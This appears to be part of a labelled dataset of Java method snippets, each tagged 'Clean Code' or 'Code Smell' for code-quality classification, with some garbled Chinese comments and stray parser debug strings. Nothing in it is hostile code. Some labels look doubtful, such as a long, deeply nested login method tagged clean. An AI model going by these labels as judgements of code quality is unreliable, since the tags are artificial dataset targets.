  WebSearchRequest webSearchRequest=WebSearchRequest.builder().searchTerms(searchTerm).geoLocation(""fr"").build();
  List<WebSearchOrganicResult> webSearchOrganicResults=searchEngine().search(webSearchRequest).results();
  assertThat(webSearchOrganicResults).isNotNull();
  assertThat(webSearchOrganicResults).as(""At least one result should be contains 'Emmanuel Macro' ignoring case"").anySatisfy(result -> assertThat(result.title()).containsIgnoringCase(""Emmanuel Macro""));
}
",0,Clean Code
"@Override protected void updateCaret(){
  final int y=getCaretMouseReleasedY();
  setCaret(m_caretX,m_caretX,y,m_caretX,m_caretX,y);
}
",0,Clean Code
"@Override public boolean iterateAlreadyForcedMemberValues(ForcedMemberValueConsumer consumer){
  return true;
}
",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 10;</code>
 * @return this
 */
public AvatarExpUpScRsp clearRetcode(){
  bitField0_&=~0x00000001;
  retcode=0;
  return this;
}",0,Clean Code
"private void checkEmojiOnly(int[] emojiOnly){
  checkEmojiOnly(emojiOnly == null ? null : emojiOnly[0]);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@51808f7a",0,Clean Code
"@Bean @ConditionalOnMissingBean public MilvusServiceClient milvusClient(MilvusVectorStoreProperties serverProperties,MilvusServiceClientProperties clientProperties,MilvusServiceClientConnectionDetails connectionDetails){
  var builder=ConnectParam.newBuilder().withHost(connectionDetails.getHost()).withPort(connectionDetails.getPort()).withDatabaseName(serverProperties.getDatabaseName()).withConnectTimeout(clientProperties.getConnectTimeoutMs(),TimeUnit.MILLISECONDS).withKeepAliveTime(clientProperties.getKeepAliveTimeMs(),TimeUnit.MILLISECONDS).withKeepAliveTimeout(clientProperties.getKeepAliveTimeoutMs(),TimeUnit.MILLISECONDS).withRpcDeadline(clientProperties.getRpcDeadlineMs(),TimeUnit.MILLISECONDS).withSecure(clientProperties.isSecure()).withIdleTimeout(clientProperties.getIdleTimeoutMs(),TimeUnit.MILLISECONDS).withAuthorization(clientProperties.getUsername(),clientProperties.getPassword());
  if (clientProperties.isSecure() && StringUtils.hasText(clientProperties.getUri())) {
    builder.withUri(clientProperties.getUri());
  }
  if (clientProperties.isSecure() && StringUtils.hasText(clientProperties.getToken())) {
    builder.withToken(clientProperties.getToken());
  }
  if (clientProperties.isSecure() && StringUtils.hasText(clientProperties.getClientKeyPath())) {
    builder.withClientKeyPath(clientProperties.getClientKeyPath());
  }
  if (clientProperties.isSecure() && StringUtils.hasText(clientProperties.getClientPemPath())) {
    builder.withClientPemPath(clientProperties.getClientPemPath());
  }
  if (clientProperties.isSecure() && StringUtils.hasText(clientProperties.getCaPemPath())) {
    builder.withCaPemPath(clientProperties.getCaPemPath());
  }
  if (clientProperties.isSecure() && StringUtils.hasText(clientProperties.getServerPemPath())) {
    builder.withServerPemPath(clientProperties.getServerPemPath());
  }
  if (clientProperties.isSecure() && StringUtils.hasText(clientProperties.getServerName())) {
    builder.withServerName(clientProperties.getServerName());
  }
  return new MilvusServiceClient(builder.build());
}
",0,Clean Code
"private void updateEllipsis(){
  if (titlePath == null || getGraphics() == null) {
    return;
  }
  final FontMetrics fm=getGraphics().getFontMetrics();
  int maxLen=titlePath.length();
  final Insets in=getInsets();
  final int defTitleW=in.right - in.left + 100 + fm.stringWidth("" - "" + Constants.DEFAULT_WINDOW_TITLE);
  String newValue=titlePath;
  while (maxLen >= 12 && fm.stringWidth(newValue) > getWidth() - defTitleW) {
    newValue=FileUtils.getPathEllipsis(titlePath,maxLen);
    maxLen--;
  }
  setTitle(newValue);
}",0,Clean Code
"public static <K,V>Map<K,V> mapOf(K k1,V v1){
  Map<K,V> map=new HashMap<>();
  map.put(k1,v1);
  return map;
}
public static <K,V>Map<K,V> mapOf(K k1,V v1,K k2,V v2){
  Map<K,V> map=new HashMap<>();
  map.put(k1,v1);
  map.put(k2,v2);
  return map;
}",0,Clean Code
"@Override public void updateWorkflows(MetadataServicePb.UpdateWorkflowsRequest req,StreamObserver<MetadataServicePb.UpdateWorkflowsResponse> response){
  List<WorkflowDef> workflows=req.getDefsList().stream().map(PROTO_MAPPER::fromProto).collect(Collectors.toList());
  service.updateWorkflowDef(workflows);
  response.onNext(MetadataServicePb.UpdateWorkflowsResponse.getDefaultInstance());
  response.onCompleted();
}
",0,Clean Code
"@Override public GetChessRogueNousStoryInfoScRsp copyFrom(final GetChessRogueNousStoryInfoScRsp other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    retcode=other.retcode;
    subStoryInfo.copyFrom(other.subStoryInfo);
    mainStoryInfo.copyFrom(other.mainStoryInfo);
  }
  return this;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=(1 * subStoryInfo.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(subStoryInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * mainStoryInfo.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(mainStoryInfo);
  }
  return size;
}",0,Clean Code
"public static ParameterizedType mapOf(Type keyType,Type valueType){
  return parameterizedType(Map.class,keyType,valueType);
}
",0,Clean Code
"@ApiOperation(""鏌ョ湅鍛樺伐鑰冩牳璁″垝璇︽儏"") @PostMapping(""/queryAppraisalInformation"") public Result<AppraisalEmployeeInfoVO> queryAppraisalInformation(@RequestBody QuotaInfoQueryBO quotaInfoQueryBO){
  AppraisalEmployeeInfoVO appraisalEmployeeInfoVO=appraisalEmployeeService.quotaInformation(quotaInfoQueryBO);
  return Result.ok(appraisalEmployeeInfoVO);
}
",0,Clean Code
"private LinearScalingTransformerProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private LinearScalingTransformerProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@310de4c5",0,Clean Code
"@Override public Wallet importWallet(InputStream inputStream,String password) throws ImportException {
  Storage storage=null;
  Wallet wallet=null;
  File tempFile=null;
  try {
    tempFile=File.createTempFile(""sparrow"",null);
    java.nio.file.Files.copy(inputStream,tempFile.toPath(),StandardCopyOption.REPLACE_EXISTING);
    PersistenceType persistenceType=Storage.detectPersistenceType(tempFile);
    persistenceType=(persistenceType == null ? PersistenceType.JSON : persistenceType);
    if (persistenceType != PersistenceType.JSON || !isEncrypted(tempFile)) {
      File tempTypedFile=new File(tempFile.getParentFile(),tempFile.getName() + ""."" + persistenceType.getExtension());
      tempFile.renameTo(tempTypedFile);
      tempFile=tempTypedFile;
    }
    storage=new Storage(persistenceType,tempFile);
    if (!isEncrypted(tempFile)) {
      wallet=storage.loadUnencryptedWallet().getWallet();
    }
 else {
      WalletAndKey walletAndKey=storage.loadEncryptedWallet(password);
      wallet=walletAndKey.getWallet();
      wallet.decrypt(walletAndKey.getKey());
      for (      Map.Entry<WalletAndKey,Storage> entry : walletAndKey.getChildWallets().entrySet()) {
        entry.getKey().getWallet().decrypt(entry.getKey().getKey());
      }
    }
    return wallet;
  }
 catch (  IOException|StorageException e) {
    throw new ImportException(""Error importing Sparrow wallet"",e);
  }
 finally {
    if (storage != null) {
      storage.close();
    }
    if (tempFile != null) {
      if (wallet != null) {
        File migratedWalletFile=Storage.getExistingWallet(tempFile.getParentFile(),wallet.getName());
        if (migratedWalletFile != null) {
          migratedWalletFile.delete();
        }
      }
      tempFile.delete();
    }
  }
}
",0,Clean Code
"/** 
 * <code>optional uint32 num = 12;</code>
 * @param value the num to set
 * @return this
 */
public Item setNum(final int value){
  bitField0_|=0x00000040;
  num=value;
  return this;
}",0,Clean Code
"@Override public SyncRogueMapRoomScNotify clone(){
  return new SyncRogueMapRoomScNotify().copyFrom(this);
}
",0,Clean Code
"@VisibleFor(""testing"") protected String parseStatement(String query){
  paramNames.clear();
  int length=query.length();
  StringBuilder parsedQuery=new StringBuilder(length);
  boolean inSingleQuote=false;
  boolean inDoubleQuote=false;
  for (int i=0; i < length; i++) {
    char c=query.charAt(i);
    if (inSingleQuote) {
      if (c == '\'') {
        inSingleQuote=false;
      }
    }
 else     if (inDoubleQuote) {
      if (c == '""') {
        inDoubleQuote=false;
      }
    }
 else {
      if (c == '\'') {
        inSingleQuote=true;
      }
 else       if (c == '""') {
        inDoubleQuote=true;
      }
 else       if (c == ':' && i + 1 < length && Character.isJavaIdentifierStart(query.charAt(i + 1)) && !parsedQuery.toString().endsWith("":"")) {
        int j=i + 2;
        while (j < length && Character.isJavaIdentifierPart(query.charAt(j))) {
          j++;
        }
        String name=query.substring(i + 1,j);
        c='?';
        i+=name.length();
        paramNames.add(name);
      }
    }
    parsedQuery.append(c);
  }
  return parsedQuery.toString().replace(tableName,elementPrefixer(tablePrefix,tableName));
}",0,Clean Code
"@Override public void dropSchema(Connection connection,String databaseName,String schemaName){
}
",0,Clean Code
"/** 
 * <code>optional uint32 shop_id = 11;</code>
 * @param value the shopId to set
 * @return this
 */
public BuyGoodsCsReq setShopId(final int value){
  bitField0_|=0x00000008;
  shopId=value;
  return this;
}",0,Clean Code
"@EventHandler private void onTick(TickEvent.Pre event){
  for (  Vector3d point : points)   vec3s.free(point);
  points.clear();
  for (  Entity e : mc.world.getEntities()) {
    if (!(e instanceof ProjectileEntity))     continue;
    if (!allProjectiles.get() && !(e instanceof ArrowEntity))     continue;
    if (ignoreOwn.get()) {
      UUID owner=((ProjectileEntityAccessor)e).getOwnerUuid();
      if (owner != null && owner.equals(mc.player.getUuid()))       continue;
    }
    if (!simulator.set(e,accurate.get()))     continue;
    for (int i=0; i < (simulationSteps.get() > 0 ? simulationSteps.get() : Integer.MAX_VALUE); i++) {
      points.add(vec3s.get().set(simulator.pos));
      if (simulator.tick() != null)       break;
    }
  }
  if (isValid(Vec3d.ZERO,false))   return;
  double speed=moveSpeed.get();
  for (int i=0; i < 500; i++) {
    boolean didMove=false;
    Collections.shuffle(possibleMoveDirections);
    for (    Vec3d direction : possibleMoveDirections) {
      Vec3d velocity=direction.multiply(speed);
      if (isValid(velocity,true)) {
        move(velocity);
        didMove=true;
        break;
      }
    }
    if (didMove)     break;
    speed+=moveSpeed.get();
  }
}",0,Clean Code
"@Override public Prompt create(){
  return new Prompt(render(new HashMap<>()));
}
@Override public Prompt create(Map<String,Object> model){
  return new Prompt(render(model));
}
",0,Clean Code
"/** 
 * 楂橀搧涓�绛夊骇鏄惁瀛樺湪妫�鏌ユ柟娉�
 * @param key              缂撳瓨Key
 * @param convert          搴т綅缁熻Map
 * @param distributedCache 鍒嗗竷寮忕紦瀛樻帴鍙�
 * @return 鍒ゆ柇搴т綅鏄惁瀛樺湪 true or false
 */
@Override public boolean checkSeat(String key,HashMap<Integer,Integer> convert,DistributedCache distributedCache){
  boolean flag=false;
  ValueOperations<String,String> opsForValue=((StringRedisTemplate)distributedCache.getInstance()).opsForValue();
  AtomicInteger matchCount=new AtomicInteger(0);
  for (int i=0; i < 4; i++) {
    int cnt=0;
    if (convert.containsKey(i)) {
      for (int j=0; j < 7; j++) {
        Boolean bit=opsForValue.getBit(key,i + j * 4);
        if (null != bit && bit) {
          cnt=cnt + 1;
        }
        if (cnt == convert.get(i)) {
          matchCount.getAndIncrement();
          break;
        }
      }
      if (cnt != convert.get(i)) {
        break;
      }
    }
    if (matchCount.get() == convert.size()) {
      flag=true;
      break;
    }
  }
  return flag;
}",1,Code Smell
"@Override public int length(){
  return (int)(segment.byteSize() / Float.BYTES);
}
",0,Clean Code
"@Override @RequestMapping(value=""login"",method=RequestMethod.POST) public ResponseResult login(String username,String password,String code) throws Exception {
  AuthToken authToken=authService.login(username,password,clientId,clientSecret);
  UserBasicInfo userBasicInfo=AuthenticationInterceptor.parseJwt(authToken.getJwt_token());
  CfUser cfUser=cfUserService.getUserByUid(userBasicInfo.getId(),true);
  cfUser.setPassword(null);
  CfCarParkLinkUserQuery cfCarParkLinkUserQuery=new CfCarParkLinkUserQuery();
  cfCarParkLinkUserQuery.setUid(userBasicInfo.getId());
  List<CfCarParkLinkUser> cfCarParkLinkUsers=cfCarParkLinkUserService.getListByQuery(cfCarParkLinkUserQuery);
  if (cfCarParkLinkUsers != null && cfCarParkLinkUsers.size() > 0) {
    for (    CfCarParkLinkUser cfCarParkLinkUser : cfCarParkLinkUsers) {
      if (StringUtils.isNotEmpty(cfCarParkLinkUser.getCheckPointIds())) {
        CfCarParkCheckpointQuery cfCarParkCheckpointQuery=new CfCarParkCheckpointQuery();
        String[] checkPointIds=cfCarParkLinkUser.getCheckPointIds().split("","");
        cfCarParkCheckpointQuery.setIds(new ArrayList<>());
        for (int i=0; i < checkPointIds.length; i++) {
          cfCarParkCheckpointQuery.getIds().add(checkPointIds[i]);
        }
        List<CfCarParkCheckpoint> cfCarParkCheckpoints=cfCarParkCheckpointService.getListByQuery(cfCarParkCheckpointQuery);
        if (cfCarParkCheckpoints != null && cfCarParkCheckpoints.size() > 0) {
          cfCarParkCheckpointQuery.setIds(new ArrayList<>());
          for (          CfCarParkCheckpoint cfCarParkCheckpoint : cfCarParkCheckpoints) {
            cfCarParkCheckpointQuery.getIds().add(cfCarParkCheckpoint.getId());
          }
          cfCarParkCheckpointQuery.setDutyUid(null);
          CfCarParkCheckpoint cfCarParkCheckpoint=new CfCarParkCheckpoint();
          cfCarParkCheckpoint.setDutyUid(userBasicInfo.getId());
          cfCarParkCheckpointService.updateByQuery(cfCarParkCheckpoint,cfCarParkCheckpointQuery);
        }
      }
    }
    if (System.currentTimeMillis() - cfCarParkLinkUsers.get(0).getStartDutyTime() > 39600000) {
      CfCarParkLinkUser cfCarParkLinkUser=new CfCarParkLinkUser();
      cfCarParkLinkUser.setStartDutyTime(System.currentTimeMillis());
      cfCarParkLinkUserService.updateByQuery(cfCarParkLinkUser,cfCarParkLinkUserQuery);
    }
  }
  return new ResponseResult(CommonCode.SUCCESS,cfUser,authToken,0);
}",0,Clean Code
"private void setupGradient(){
  final int height=getMeasuredHeight() > 0 ? getMeasuredHeight() : AndroidUtilities.displaySize.y;
  if (entry.gradientTopColor == 0 || entry.gradientBottomColor == 0) {
    if (bitmap != null) {
      DominantColors.getColors(true,bitmap,true,colors -> {
        entry.gradientTopColor=gradientTop=colors[0];
        entry.gradientBottomColor=gradientBottom=colors[1];
        gradientPaint.setShader(new LinearGradient(0,0,0,height,colors,new float[]{0,1},Shader.TileMode.CLAMP));
        invalidate();
        if (textureView != null) {
          textureView.updateUiBlurGradient(gradientTop,gradientBottom);
        }
        if (photoFilterView != null) {
          photoFilterView.updateUiBlurGradient(gradientTop,gradientBottom);
        }
      }
);
    }
 else     if (thumbBitmap != null) {
      DominantColors.getColors(true,thumbBitmap,true,colors -> {
        entry.gradientTopColor=gradientTop=colors[0];
        entry.gradientBottomColor=gradientBottom=colors[1];
        gradientPaint.setShader(new LinearGradient(0,0,0,height,colors,new float[]{0,1},Shader.TileMode.CLAMP));
        invalidate();
        if (textureView != null) {
          textureView.updateUiBlurGradient(gradientTop,gradientBottom);
        }
        if (photoFilterView != null) {
          photoFilterView.updateUiBlurGradient(gradientTop,gradientBottom);
        }
      }
);
    }
 else {
      gradientPaint.setShader(null);
    }
  }
 else {
    gradientPaint.setShader(new LinearGradient(0,0,0,height,new int[]{gradientTop=entry.gradientTopColor,gradientBottom=entry.gradientBottomColor},new float[]{0,1},Shader.TileMode.CLAMP));
    if (textureView != null) {
      textureView.updateUiBlurGradient(gradientTop,gradientBottom);
    }
    if (photoFilterView != null) {
      photoFilterView.updateUiBlurGradient(gradientTop,gradientBottom);
    }
  }
  invalidate();
}",0,Clean Code
"/** 
 * Creates a new edit mode object which is tied to the given graph.
 * @param graph The owning graph of the edit mode.
 */
public ZyEditMode(final AbstractZyGraph<NodeType,EdgeType> graph){
  m_graph=Preconditions.checkNotNull(graph);
  m_labelKeyHandler=createNodeKeyHandler(graph);
  m_actionFactory=createStateActionFactory();
  m_stateFactory=new CStateFactory<>(graph,m_listeners,m_actionFactory);
  m_state=m_stateFactory.createDefaultState();
  setDefaultBehaviour();
}
",0,Clean Code
"public static void main(String... args){
  String token=System.getenv(""OPENAI_TOKEN"");
  OpenAiService service=new OpenAiService(token);
  FunctionExecutor functionExecutor=new FunctionExecutor(Collections.singletonList(ChatFunction.builder().name(""get_weather"").description(""Get the current weather of a location"").executor(Weather.class,w -> new WeatherResponse(w.location,w.unit,new Random().nextInt(50),""sunny"")).build()));
  List<ChatMessage> messages=new ArrayList<>();
  ChatMessage systemMessage=new ChatMessage(ChatMessageRole.SYSTEM.value(),""You are an assistant that answers using the local slang of the given place, uncensored."");
  messages.add(systemMessage);
  System.out.print(""First Query: "");
  Scanner scanner=new Scanner(System.in);
  ChatMessage firstMsg=new ChatMessage(ChatMessageRole.USER.value(),scanner.nextLine());
  messages.add(firstMsg);
  while (true) {
    ChatCompletionRequest chatCompletionRequest=ChatCompletionRequest.builder().model(""gpt-3.5-turbo-0613"").messages(messages).functions(functionExecutor.getFunctions()).functionCall(ChatCompletionRequest.ChatCompletionRequestFunctionCall.of(""auto"")).n(1).maxTokens(256).logitBias(new HashMap<>()).build();
    Flowable<ChatCompletionChunk> flowable=service.streamChatCompletion(chatCompletionRequest);
    AtomicBoolean isFirst=new AtomicBoolean(true);
    ChatMessage chatMessage=service.mapStreamToAccumulator(flowable).doOnNext(accumulator -> {
      if (accumulator.isFunctionCall()) {
        if (isFirst.getAndSet(false)) {
          System.out.println(""Executing function "" + accumulator.getAccumulatedChatFunctionCall().getName() + ""..."");
        }
      }
 else {
        if (isFirst.getAndSet(false)) {
          System.out.print(""Response: "");
        }
        if (accumulator.getMessageChunk().getContent() != null) {
          System.out.print(accumulator.getMessageChunk().getContent());
        }
      }
    }
).doOnComplete(System.out::println).lastElement().blockingGet().getAccumulatedMessage();
    messages.add(chatMessage);
    if (chatMessage.getFunctionCall() != null) {
      System.out.println(""Trying to execute "" + chatMessage.getFunctionCall().getName() + ""..."");
      ChatMessage functionResponse=functionExecutor.executeAndConvertToMessageHandlingExceptions(chatMessage.getFunctionCall());
      System.out.println(""Executed "" + chatMessage.getFunctionCall().getName() + ""."");
      messages.add(functionResponse);
      continue;
    }
    System.out.print(""Next Query: "");
    String nextLine=scanner.nextLine();
    if (nextLine.equalsIgnoreCase(""exit"")) {
      System.exit(0);
    }
    messages.add(new ChatMessage(ChatMessageRole.USER.value(),nextLine));
  }
}",0,Clean Code
"@Override public String generateCode(){
  addFormattedAnnotation(CodeConstants.INDENT);
  super.addIndent();
  if (isPublic(modifiers)) {
    codeBuffer.append(""public "");
  }
  if (isProtected(modifiers)) {
    codeBuffer.append(""protected "");
  }
  if (isPrivate(modifiers)) {
    codeBuffer.append(""private "");
  }
  if (isAbstract(modifiers)) {
    codeBuffer.append(""abstract "");
  }
  if (isStatic(modifiers)) {
    codeBuffer.append(""static "");
  }
  if (isFinal(modifiers)) {
    codeBuffer.append(""final "");
  }
  if (returnType == null) {
    codeBuffer.append(""void"");
  }
 else {
    codeBuffer.append(returnType.getShortName());
  }
  super.addSpace();
  codeBuffer.append(name);
  super.addOpenParen();
  codeBuffer.append(parameterTypes.stream().map(ParamTarget::generateCode).collect(Collectors.joining("", "")));
  super.addCloseParen();
  if (CollectionUtils.isNotEmpty(exceptionTypes)) {
    codeBuffer.append("" throws "");
    codeBuffer.append(exceptionTypes.stream().map(ClassWrapper::getShortName).collect(Collectors.joining("", "")));
  }
  super.addSpace();
  super.addOpenBrace();
  int indent=CodeConstants.INDENT << 1;
  for (  String bodyLine : bodyLines) {
    if (bodyLine.startsWith(""}"")) {
      indent-=CodeConstants.INDENT;
    }
    super.addNewLine();
    super.addIndent(indent);
    if (!SymbolConstants.LINE_BREAK.equals(bodyLine)) {
      super.addBodyLine(bodyLine);
    }
    if (bodyLine.endsWith(""{"") || bodyLine.endsWith("":"")) {
      indent+=CodeConstants.INDENT;
    }
  }
  indent-=CodeConstants.INDENT;
  super.addNewLine();
  super.addIndent(indent);
  super.addCloseBrace();
  return codeBuffer.toString();
}",0,Clean Code
"@Override public void visitSpecific(Node<PrestoExpression> expr){
  if (expr instanceof PrestoConstant) {
    visit((PrestoConstant)expr);
  }
 else   if (expr instanceof PrestoSelect) {
    visit((PrestoSelect)expr);
  }
 else   if (expr instanceof PrestoJoin) {
    visit((PrestoJoin)expr);
  }
 else   if (expr instanceof PrestoCastFunction) {
    visit((PrestoCastFunction)expr);
  }
 else   if (expr instanceof PrestoFunctionWithoutParenthesis) {
    visit((PrestoFunctionWithoutParenthesis)expr);
  }
 else   if (expr instanceof PrestoAtTimeZoneOperator) {
    visit((PrestoAtTimeZoneOperator)expr);
  }
 else   if (expr instanceof PrestoMultiValuedComparison) {
    visit((PrestoMultiValuedComparison)expr);
  }
 else   if (expr instanceof PrestoQuantifiedComparison) {
    visit((PrestoQuantifiedComparison)expr);
  }
 else {
    throw new AssertionError(expr.getClass());
  }
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code RotaterData}
 */
public static RotaterData newInstance(){
  return new RotaterData();
}
",0,Clean Code
"public static ParameterizedType optionalOf(Type elementType){
  return parameterizedType(Optional.class,elementType);
}
",0,Clean Code
"public ScanResult<Tuple> zscan(String key,int cursor){
  return jedisCommands.zscan(key,"""" + cursor);
}
",0,Clean Code
"/** 
 * Returns the record canonical constructor. 
 */
public static Tuple2<Constructor,MethodHandle> getRecordConstructor(Class<?> cls){
  return ctrCache.get(cls);
}",0,Clean Code
"@Override public EntityMotion clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  motion.clearQuick();
  return this;
}",0,Clean Code
"private void describeSummary(StringBuilder builder,String indent){
  var nonTrivialMismatches=findNonTrivialMismatches();
  if (nonTrivialMismatches.isEmpty()) {
    if (actualValue instanceof VmNull) {
      builder.append(ErrorMessages.createIndented(""typeMismatchValue"",indent,sourceSection.getCharacters().toString(),""null""));
    }
 else {
      builder.append(ErrorMessages.createIndented(""typeMismatch"",indent,sourceSection.getCharacters().toString(),VmUtils.getClass(actualValue)));
    }
  }
 else {
    builder.append(ErrorMessages.createIndented(""typeMismatchDifferent"",indent,sourceSection.getCharacters().toString(),VmUtils.getClass(actualValue)));
  }
  builder.append(""\n"").append(indent).append(""Value: "").append(VmValueRenderer.singleLine(80 - indent.length()).render(actualValue));
}",0,Clean Code
"public static String nullSafeToString(Object obj){
  if (obj == null) {
    return NULL_STRING;
  }
  if (obj instanceof String) {
    return (String)obj;
  }
  if (obj instanceof Object[]) {
    return nullSafeToString((Object[])obj);
  }
  if (obj instanceof boolean[]) {
    return nullSafeToString((boolean[])obj);
  }
  if (obj instanceof byte[]) {
    return nullSafeToString((byte[])obj);
  }
  if (obj instanceof char[]) {
    return nullSafeToString((char[])obj);
  }
  if (obj instanceof double[]) {
    return nullSafeToString((double[])obj);
  }
  if (obj instanceof float[]) {
    return nullSafeToString((float[])obj);
  }
  if (obj instanceof int[]) {
    return nullSafeToString((int[])obj);
  }
  if (obj instanceof long[]) {
    return nullSafeToString((long[])obj);
  }
  if (obj instanceof short[]) {
    return nullSafeToString((short[])obj);
  }
  String str=obj.toString();
  return (str != null ? str : EMPTY_STRING);
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof SwapLineupCsReq)) {
    return false;
  }
  SwapLineupCsReq other=(SwapLineupCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasIndex() || index == other.index) && (!hasPlaneId() || planeId == other.planeId) && (!hasSrcSlot() || srcSlot == other.srcSlot) && (!hasDstSlot() || dstSlot == other.dstSlot) && (!hasExtraLineupType() || extraLineupType == other.extraLineupType) && (!hasIsVirtual() || isVirtual == other.isVirtual);
}",0,Clean Code
"public static void writeLocalDate(MemoryBuffer buffer,LocalDate value){
  buffer.writeInt32(value.getYear());
  buffer.writeByte(value.getMonthValue());
  buffer.writeByte(value.getDayOfMonth());
}",0,Clean Code
"/** 
 * Query topic's broker id set
 * @param req       Http Servlet Request
 * @param sBuffer   string buffer
 * @param result    process result
 * @return    process result
 */
public StringBuilder adminQuerySimpleBrokerId(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result){
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSTOPICNAME,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  Set<String> topicNameSet=(Set<String>)result.getRetData();
  if (!WebParameterUtils.getBooleanParamValue(req,WebFieldDef.WITHIP,false,false,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  boolean withIp=(Boolean)result.getRetData();
  Map<String,Map<Integer,String>> topicBrokerConfigMap=defMetaDataService.getTopicBrokerConfigInfo(topicNameSet);
  int dataCount=0;
  WebParameterUtils.buildSuccessWithDataRetBegin(sBuffer);
  for (  Map.Entry<String,Map<Integer,String>> entry : topicBrokerConfigMap.entrySet()) {
    if (dataCount++ > 0) {
      sBuffer.append("","");
    }
    sBuffer.append(""{\""topicName\"":\"""").append(entry.getKey()).append(""\"",\""brokerInfo\"":["");
    int topicCnt=0;
    Map<Integer,String> brokerMap=entry.getValue();
    if (withIp) {
      for (      Map.Entry<Integer,String> entry1 : brokerMap.entrySet()) {
        if (topicCnt++ > 0) {
          sBuffer.append("","");
        }
        sBuffer.append(""{\""brokerId\"":"").append(entry1.getKey()).append("",\""brokerIp\"":\"""").append(entry1.getValue()).append(""\""}"");
      }
    }
 else {
      for (      Map.Entry<Integer,String> entry1 : brokerMap.entrySet()) {
        if (topicCnt++ > 0) {
          sBuffer.append("","");
        }
        sBuffer.append(entry1.getKey());
      }
    }
    sBuffer.append(""],\""brokerCnt\"":"").append(topicCnt).append(""}"");
  }
  WebParameterUtils.buildSuccessWithDataRetEnd(sBuffer,dataCount);
  return sBuffer;
}",0,Clean Code
"protected void setUhOhText(final String uhOhText,final Font normalFont){
  if (uhOhFont == null) {
    uhOhFont=normalFont.deriveFont(Font.ITALIC);
  }
  setFont(uhOhFont);
  setText(uhOhText);
}
",0,Clean Code
"public TypeVariableNode(SourceSection sourceSection,TypeParameter typeParameter){
  super(sourceSection);
  this.typeParameter=typeParameter;
}
",0,Clean Code
"@Override public RogueBonusSelectInfo clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  bonusInfo.clear();
  return this;
}",0,Clean Code
"private TreeNodeProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private TreeNodeProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1ef75f3f",0,Clean Code
"int length();
",0,Clean Code
"/** 
 * Retrieves the response metadata associated with the AI model's response.
 * @return the response metadata
 */
ResponseMetadata getMetadata();
",0,Clean Code
"@Override protected void before(MethodHookParam param) throws Throwable {
  if (v != null) {
    findAndHookMethod(v,""j"",XC_MethodReplacement.returnConstant(true));
  }
}
@Override protected void before(MethodHookParam param) throws Throwable {
  float f=(float)param.args[0];
  if (f >= 0f) {
    hookAllConstructors(mF,new MethodHook(){
      @Override protected void before(      MethodHookParam param) throws Throwable {
        window=(Window)XposedHelpers.getObjectField(param.thisObject,""b"");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
          window.setBackgroundBlurRadius((int)f);
        }
      }
    }
);
  }
}
@Override protected void before(MethodHookParam param) throws Throwable {
  window=(Window)XposedHelpers.getObjectField(param.thisObject,""b"");
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
    window.setBackgroundBlurRadius((int)f);
  }
}
@Override protected void before(MethodHookParam param) throws Throwable {
  findAndHookMethod(""com.miui.launcher.overlay.server.pane.SlidingPaneStateManager"",""a"",boolean.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param) throws Throwable {
      param.args[0]=false;
    }
  }
);
  int mCurrentBlurRadius=XposedHelpers.getIntField(param.thisObject,""mCurrentBlurRadius"");
  XposedHelpers.setIntField(param.thisObject,""mScreenSize"",5);
  XposedHelpers.setIntField(param.thisObject,""mCurrentBlurRadius"",100);
  XposedHelpers.callMethod(param.thisObject,""blurOverlayWindow"",mCurrentBlurRadius);
}
@Override protected void before(MethodHookParam param) throws Throwable {
  param.args[0]=false;
}
@Override protected void before(MethodHookParam param) throws Throwable {
  int mCurrentBlurRadius=XposedHelpers.getIntField(param.thisObject,""mCurrentBlurRadius"");
  if (Float.compare(mCurrentBlurRadius,100f) != 0) {
    XposedHelpers.setIntField(param.thisObject,""mCurrentBlurRadius"",100);
    XposedHelpers.callMethod(param.thisObject,""blurOverlayWindow"",mCurrentBlurRadius);
  }
}
@Override protected void before(MethodHookParam param) throws Throwable {
  float f=(float)param.args[0];
  int i=(int)((f - 0.49f) * 204.08163f);
  int mCurrentBlurRadius=XposedHelpers.getIntField(param.thisObject,""mCurrentBlurRadius"");
  int i2=mCurrentBlurRadius;
  if (i2 != i) {
    if (i2 <= 0 || i >= 0) {
      mCurrentBlurRadius=i;
    }
 else {
      mCurrentBlurRadius=0;
    }
    XposedHelpers.callMethod(param.thisObject,""blurOverlayWindow"",mCurrentBlurRadius);
  }
}",0,Clean Code
"void changedTargetY(CViewEdge<?> edge,double targetY);
",0,Clean Code
"@Override public ChessRogueSelectCellCsReq clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  return this;
}",0,Clean Code
"public void setX(int x){
  this.x=x;
}
",0,Clean Code
"public boolean canDeleteMessage(boolean inScheduleMode,TLRPC.Chat chat){
  return eventId == 0 && sponsoredId == null && canDeleteMessage(currentAccount,inScheduleMode,messageOwner,chat);
}
